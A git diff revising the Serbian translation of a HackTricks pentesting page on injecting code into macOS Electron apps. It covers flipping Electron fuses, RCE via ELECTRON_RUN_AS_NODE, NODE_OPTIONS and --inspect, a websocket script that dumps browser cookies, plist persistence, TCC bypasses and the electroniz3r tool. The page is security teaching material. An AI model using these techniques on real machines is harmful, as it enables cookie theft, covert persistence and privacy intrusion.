@@ -1,4 +1,4 @@
-# Ubacivanje u macOS Electron aplikacije
+# Injekcija macOS Electron aplikacija
 
 <details>
 
@@ -6,10 +6,10 @@
 
 Drugi načini podrške HackTricks-u:
 
-* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
@@ -19,23 +19,23 @@ Drugi načini podrške HackTricks-u:
 Ako ne znate šta je Electron, možete pronaći [**mnogo informacija ovde**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps). Ali za sada samo znajte da Electron pokreće **node**.\
 I node ima neke **parametre** i **env promenljive** koje se mogu koristiti da bi se **izvršio drugi kod** osim navedene datoteke.
 
-### Electron osigurači
+### Elektronski osigurači
 
-Ove tehnike će biti diskutovane dalje, ali u poslednje vreme je Electron dodao nekoliko **sigurnosnih zastavica da bi ih sprečio**. To su [**Electron osigurači**](https://www.electronjs.org/docs/latest/tutorial/fuses) i ovo su oni koji se koriste da **spreče** Electron aplikacije na macOS-u da **učitavaju proizvoljni kod**:
+Ove tehnike će biti razmatrane u nastavku, ali u poslednje vreme Electron je dodao nekoliko **sigurnosnih zastava kako bi ih sprečio**. To su [**Elektronski osigurači**](https://www.electronjs.org/docs/latest/tutorial/fuses) i ovo su oni koji se koriste da **spreče** Electron aplikacije u macOS-u da **učitavaju proizvoljan kod**:
 
-* **`RunAsNode`**: Ako je onemogućeno, sprečava upotrebu env promenljive **`ELECTRON_RUN_AS_NODE`** za ubacivanje koda.
+* **`RunAsNode`**: Ako je onemogućeno, sprečava korišćenje env varijable **`ELECTRON_RUN_AS_NODE`** za ubacivanje koda.
 * **`EnableNodeCliInspectArguments`**: Ako je onemogućeno, parametri poput `--inspect`, `--inspect-brk` neće biti poštovani. Na taj način se sprečava ubacivanje koda.
-* **`EnableEmbeddedAsarIntegrityValidation`**: Ako je omogućeno, učitana **`asar`** **datoteka** će biti **validirana** od strane macOS-a. Na taj način se sprečava **ubacivanje koda** modifikovanjem sadržaja ove datoteke.
-* **`OnlyLoadAppFromAsar`**: Ako je ovo omogućeno, umesto pretrage za učitavanjem u sledećem redosledu: **`app.asar`**, **`app`** i na kraju **`default_app.asar`**. Proveravaće i koristiti samo app.asar, čime se obezbeđuje da je **nemoguće** učitati nevalidirani kod kada je **kombinovano** sa osiguračem **`embeddedAsarIntegrityValidation`**.
+* **`EnableEmbeddedAsarIntegrityValidation`**: Ako je omogućeno, učitana **`asar`** **datoteka** će biti **validirana** od strane macOS-a. Na ovaj način se **sprečava ubacivanje koda** modifikovanjem sadržaja ove datoteke.
+* **`OnlyLoadAppFromAsar`**: Ako je ovo omogućeno, umesto traženja za učitavanjem u sledećem redosledu: **`app.asar`**, **`app`** i na kraju **`default_app.asar`**. Proveravaće i koristiće samo app.asar, čime se osigurava da kada se **kombinuje** sa osiguračem **`embeddedAsarIntegrityValidation`** bude **nemoguće** učitati nevalidiran kod.
 * **`LoadBrowserProcessSpecificV8Snapshot`**: Ako je omogućeno, proces pregledača koristi datoteku nazvanu `browser_v8_context_snapshot.bin` za svoj V8 snimak.
 
 Još jedan interesantan osigurač koji neće sprečiti ubacivanje koda je:
 
-* **EnableCookieEncryption**: Ako je omogućeno, cookie skladište na disku je šifrovano korišćenjem kriptografskih ključeva na nivou operativnog sistema.
+* **EnableCookieEncryption**: Ako je omogućeno, skladište kolačića na disku je enkriptovano korišćenjem kriptografskih ključeva nivoa OS-a.
 
-### Provera Electron osigurača
+### Provera Elektronskih osigurača
 
-Možete **proveriti ove zastavice** iz aplikacije sa:
+Možete **proveriti ove zastave** iz aplikacije sa:
 ```bash
 npx @electron/fuses read --app /Applications/Slack.app
 
@@ -49,49 +49,47 @@ EnableEmbeddedAsarIntegrityValidation is Enabled
 OnlyLoadAppFromAsar is Enabled
 LoadBrowserProcessSpecificV8Snapshot is Disabled
 ```
-### Modifikacija elektronskih osigurača
+### Modifikacija Elektron osigurača
 
-Kako [**dokumentacija navodi**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), konfiguracija **elektronskih osigurača** je podešena unutar **Elektron binarnog fajla** koji negde sadrži string **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.
+Kako [**dokumentacija navodi**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), konfiguracija **Elektron osigurača** je podešena unutar **Elektron binarnog koda** koji negde sadrži string **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.
 
-U macOS aplikacijama, ovo se obično nalazi u `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
+U macOS aplikacijama, ovo se obično nalazi u `aplikacija.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
 ```bash
 grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
 Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
 ```
-Možete učitati ovaj fajl na [https://hexed.it/](https://hexed.it/) i pretražiti prethodni string. Nakon ovog stringa možete videti u ASCII formatu broj "0" ili "1" koji označava da li je svaki fjuza onemogućen ili omogućen. Samo izmenite heksadecimalni kod (`0x30` je `0` i `0x31` je `1`) da **izmenite vrednosti fjuza**.
+Možete učitati ovaj fajl na [https://hexed.it/](https://hexed.it/) i pretražiti prethodni string. Nakon ovog stringa možete videti u ASCII formatu broj "0" ili "1" koji pokazuje da li je svaka osigurač isključen ili uključen. Samo modifikujte heksadecimalni kod (`0x30` je `0` i `0x31` je `1`) da **modifikujete vrednosti osigurača**.
 
-<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-Imajte na umu da ako pokušate da **prepišete** **binarni fajl Electron Framework-a** unutar aplikacije sa izmenjenim bajtovima, aplikacija se neće pokrenuti.
+Imajte na umu da ako pokušate **prepisati** **binarni fajl Electron Framework-a** unutar aplikacije sa ovim izmenjenim bajtovima, aplikacija neće raditi.
 
 ## RCE dodavanje koda u Electron aplikacije
 
-Mogu postojati **spoljni JS/HTML fajlovi** koje koristi Electron aplikacija, tako da napadač može ubaciti kod u ove fajlove čiji potpis neće biti proveren i izvršiti proizvoljni kod u kontekstu aplikacije.
+Mogu postojati **spoljni JS/HTML fajlovi** koje koristi Electron aplikacija, tako da napadač može ubaciti kod u ove fajlove čiji potpis neće biti proveren i izvršiti proizvoljan kod u kontekstu aplikacije.
 
 {% hint style="danger" %}
 Međutim, trenutno postoje 2 ograničenja:
 
-* Potrebna je dozvola **`kTCCServiceSystemPolicyAppBundles`** da bi se izmenila aplikacija, pa prema podrazumevanim podešavanjima ovo više nije moguće.
-* Kompajlirani fajl **`asap`** obično ima fjuze **`embeddedAsarIntegrityValidation`** `i` **`onlyLoadAppFromAsar`** `omogućene`
+* Potrebna je dozvola **`kTCCServiceSystemPolicyAppBundles`** da bi se modifikovala aplikacija, tako da po defaultu ovo više nije moguće.
+* Kompajlirani fajl **`asap`** obično ima osigurače **`embeddedAsarIntegrityValidation`** `i` **`onlyLoadAppFromAsar`** `omogućene`
 
-Ovo čini ovaj put napada složenijim (ili nemogućim).
+Što ovaj put napada čini složenijim (ili nemogućim).
 {% endhint %}
 
-Imajte na umu da je moguće zaobići zahtev za **`kTCCServiceSystemPolicyAppBundles`** kopiranjem aplikacije u drugi direktorijum (kao što je **`/tmp`**), preimenovanjem foldera **`app.app/Contents`** u **`app.app/NotCon`**, **izmenom** **asar** fajla sa vašim **zlonamernim** kodom, preimenovanjem nazad u **`app.app/Contents`** i izvršavanjem.
+Imajte na umu da je moguće zaobići zahtev za **`kTCCServiceSystemPolicyAppBundles`** kopiranjem aplikacije u drugi direktorijum (kao što je **`/tmp`**), preimenovanjem foldera **`app.app/Contents`** u **`app.app/NotCon`**, **modifikovanjem** **asar** fajla sa vašim **zlonamernim** kodom, ponovnim preimenovanjem u **`app.app/Contents`** i izvršavanjem.
 
-Kod iz asar fajla možete raspakovati sa:
+Možete otpakovati kod iz asar fajla sa:
 ```bash
 npx asar extract app.asar app-decomp
 ```
-I vratite ga nazad nakon što ste ga izmenili sa:
+I spakujte ga nazad nakon što ste ga modifikovali sa:
 ```bash
 npx asar pack app-decomp app-new.asar
 ```
 ## RCE sa `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>
 
-Prema [**dokumentaciji**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node), ako je ova promenljiva okruženja postavljena, proces će se pokrenuti kao običan Node.js proces.
-
-{% code overflow="wrap" %}
+Prema [**dokumentaciji**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node), ako je ova promenljiva okoline postavljena, pokrenuće proces kao običan Node.js proces.
 ```bash
 # Run this
 ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
@@ -101,12 +99,12 @@ require('child_process').execSync('/System/Applications/Calculator.app/Contents/
 {% endcode %}
 
 {% hint style="danger" %}
-Ako je isključena opcija **`RunAsNode`** za fuse, varijabla okruženja **`ELECTRON_RUN_AS_NODE`** će biti ignorisana i ovo neće raditi.
+Ako je fjuž **`RunAsNode`** onemogućen, promenljiva okruženja **`ELECTRON_RUN_AS_NODE`** će biti ignorisana, i ovo neće raditi.
 {% endhint %}
 
-### Injekcija iz App Plist fajla
+### Injekcija iz App Plist datoteke
 
-Kao što je [**predloženo ovde**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), možete zloupotrebiti ovu varijablu okruženja u plist fajlu kako biste održali postojanost:
+Kao što je [**predloženo ovde**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), možete zloupotrebiti ovu promenljivu okruženja u plist datoteci kako biste održali postojanost:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -145,14 +143,14 @@ NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Di
 {% endcode %}
 
 {% hint style="danger" %}
-Ako je fuzija **`EnableNodeOptionsEnvironmentVariable`** **onemogućena**, aplikacija će **ignorisati** promenljivu okruženja **NODE\_OPTIONS** prilikom pokretanja, osim ako je promenljiva okruženja **`ELECTRON_RUN_AS_NODE`** postavljena, koja će takođe biti **ignorisana** ako je fuzija **`RunAsNode`** onemogućena.
+Ako je osigurač **`EnableNodeOptionsEnvironmentVariable`** **onemogućen**, aplikacija će **ignorisati** env var **NODE\_OPTIONS** prilikom pokretanja, osim ako je postavljena env varijabla **`ELECTRON_RUN_AS_NODE`**, koja će takođe biti **ignorisana** ako je osigurač **`RunAsNode`** onemogućen.
 
-Ako ne postavite **`ELECTRON_RUN_AS_NODE`**, dobićete **grešku**: `Većina NODE_OPTION opcija nije podržana u pakovanim aplikacijama. Pogledajte dokumentaciju za više detalja.`
+Ako ne postavite **`ELECTRON_RUN_AS_NODE`**, dobićete **grešku**: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`
 {% endhint %}
 
 ### Injekcija iz App Plist-a
 
-Možete zloupotrebiti ovu promenljivu okruženja u plist-u kako biste održali postojanost dodavanjem ovih ključeva:
+Možete zloupotrebiti ovu env varijablu u plist datoteci da biste održali upornost dodavanjem ovih ključeva:
 ```xml
 <dict>
 <key>EnvironmentVariables</key>
@@ -170,7 +168,7 @@ Možete zloupotrebiti ovu promenljivu okruženja u plist-u kako biste održali p
 ```
 ## RCE sa inspekcijom
 
-Prema [**ovom**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f) izvoru, ako pokrenete Electron aplikaciju sa opcijama kao što su **`--inspect`**, **`--inspect-brk`** i **`--remote-debugging-port`**, otvoriće se **debug port** na koji možete da se povežete (na primer iz Chrome preko `chrome://inspect`) i bićete u mogućnosti da **ubacite kod** ili čak pokrenete nove procese.\
+Prema [**ovom**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f) izvoru, ako pokrenete Electron aplikaciju sa zastavicama poput **`--inspect`**, **`--inspect-brk`** i **`--remote-debugging-port`**, biće otvoren **debug port** na koji možete da se povežete (na primer iz Chrome-a na `chrome://inspect`) i bićete u mogućnosti da **ubacite kod u nju** ili čak pokrenete nove procese.\
 Na primer:
 
 {% code overflow="wrap" %}
@@ -182,14 +180,14 @@ require('child_process').execSync('/System/Applications/Calculator.app/Contents/
 {% endcode %}
 
 {% hint style="danger" %}
-Ako je isključena opcija **`EnableNodeCliInspectArguments`**, aplikacija će **ignorisati node parametre** (kao što su `--inspect`) prilikom pokretanja, osim ako je postavljena okružna promenljiva **`ELECTRON_RUN_AS_NODE`**, koja će takođe biti **ignorisana** ako je isključena opcija **`RunAsNode`**.
+Ako je osigurač **`EnableNodeCliInspectArguments`** onemogućen, aplikacija će **ignorisati node parametre** (kao što su `--inspect`) prilikom pokretanja osim ako je postavljena promenljiva okruženja **`ELECTRON_RUN_AS_NODE`**, koja će takođe biti **ignorisana** ako je osigurač **`RunAsNode`** onemogućen.
 
-Međutim, i dalje možete koristiti **elektron parametar `--remote-debugging-port=9229`**, ali prethodni payload neće raditi za izvršavanje drugih procesa.
+Međutim, i dalje možete koristiti **electron parametar `--remote-debugging-port=9229`** ali prethodni payload neće raditi za izvršavanje drugih procesa.
 {% endhint %}
 
-Korišćenjem parametra **`--remote-debugging-port=9222`** moguće je ukrasti neke informacije iz Electron aplikacije kao što su **istorija** (sa GET komandama) ili **kolačići** pregledača (jer se dešifruju unutar pregledača i postoji **json endpoint** koji ih daje).
+Korišćenjem parametra **`--remote-debugging-port=9222`** moguće je ukrasti neke informacije iz Electron aplikacije poput **istorije** (sa GET komandama) ili **kolačića** pregledača (jer su **dekriptovani** unutar pregledača i postoji **json endpoint** koji će ih dati).
 
-Možete naučiti kako to uraditi [**ovde**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) i [**ovde**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) i koristiti automatski alat [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) ili jednostavan skript kao što je:
+Možete naučiti kako to uraditi [**ovde**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) i [**ovde**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) i koristiti automatski alat [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) ili jednostavan skript poput:
 ```python
 import websocket
 ws = websocket.WebSocket()
@@ -197,11 +195,11 @@ ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00",
 ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
 print(ws.recv()
 ```
-U [**ovom blogpostu**](https://hackerone.com/reports/1274695), ovaj debagovanje se zloupotrebljava da bi se omogućilo headless chrome-u da **preuzima proizvoljne datoteke na proizvoljnim lokacijama**.
+U [**ovom blog postu**](https://hackerone.com/reports/1274695), ovaj debagovanje je zloupotrebljen da bi headless chrome **preuzeo proizvoljne datoteke na proizvoljne lokacije**.
 
 ### Injekcija iz App Plist datoteke
 
-Možete zloupotrebiti ovu env varijablu u plist datoteci kako biste održali postojanost dodavanjem ovih ključeva:
+Mogli biste zloupotrebiti ovu env promenljivu u plist datoteci da biste održali upornost dodavanjem ovih ključeva:
 ```xml
 <dict>
 <key>ProgramArguments</key>
@@ -215,22 +213,22 @@ Možete zloupotrebiti ovu env varijablu u plist datoteci kako biste održali pos
 <true/>
 </dict>
 ```
-## Zaobilazak TCC-a zloupotrebom starijih verzija
+## Bypass TCC korišćenjem starijih verzija
 
 {% hint style="success" %}
-TCC daemon iz macOS-a ne proverava izvršenu verziju aplikacije. Dakle, ako **ne možete ubaciti kod u Electron aplikaciju** pomoću bilo koje od prethodnih tehnika, možete preuzeti prethodnu verziju aplikacije i ubaciti kod u nju jer će i dalje dobiti TCC privilegije (osim ako Trust Cache to sprečava).
+TCC daemon sa macOS-a ne proverava izvršenu verziju aplikacije. Dakle, ako **ne možete ubaciti kod u Electron aplikaciju** pomoću bilo koje od prethodnih tehnika, možete preuzeti prethodnu verziju APLIKACIJE i ubaciti kod u nju jer će i dalje dobiti TCC privilegije (osim ako Trust Cache to sprečava).
 {% endhint %}
 
 ## Pokretanje ne-JS koda
 
-Prethodne tehnike će vam omogućiti pokretanje **JS koda unutar procesa Electron aplikacije**. Međutim, zapamtite da **podprocesi pokreću se pod istim sandbox profilom** kao i roditeljska aplikacija i **nasleđuju njihove TCC dozvole**.\
-Dakle, ako želite zloupotrebiti privilegije da pristupite kameri ili mikrofonu, na primer, jednostavno možete **pokrenuti drugi binarni fajl iz procesa**.
+Prethodne tehnike će vam omogućiti da pokrenete **JS kod unutar procesa elektronske aplikacije**. Međutim, zapamtite da **dečiji procesi pokreću isti sandbox profil** kao roditeljska aplikacija i **nasleđuju njihove TCC dozvole**.\
+Stoga, ako želite zloupotrebiti privilegije da pristupite kameri ili mikrofonu na primer, jednostavno možete **pokrenuti drugi binarni fajl iz procesa**.
 
 ## Automatsko ubacivanje
 
-Alatka [**electroniz3r**](https://github.com/r3ggi/electroniz3r) se može lako koristiti za **pronalaženje ranjivih Electron aplikacija** instaliranih i ubacivanje koda u njih. Ovaj alat će pokušati koristiti tehniku **`--inspect`**:
+Alat [**electroniz3r**](https://github.com/r3ggi/electroniz3r) se može lako koristiti za **pronalaženje ranjivih elektronskih aplikacija** instaliranih i ubacivanje koda u njih. Ovaj alat će pokušati koristiti tehniku **`--inspect`**:
 
-Morate je sami kompajlirati i možete je koristiti na sledeći način:
+Morate ga sami kompajlirati i možete ga koristiti na sledeći način:
 ```bash
 # Find electron apps
 ./electroniz3r list-apps
@@ -278,10 +276,10 @@ Shell binding requested. Check `nc 127.0.0.1 12345`
 
 Drugi načini podrške HackTricks-u:
 
-* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
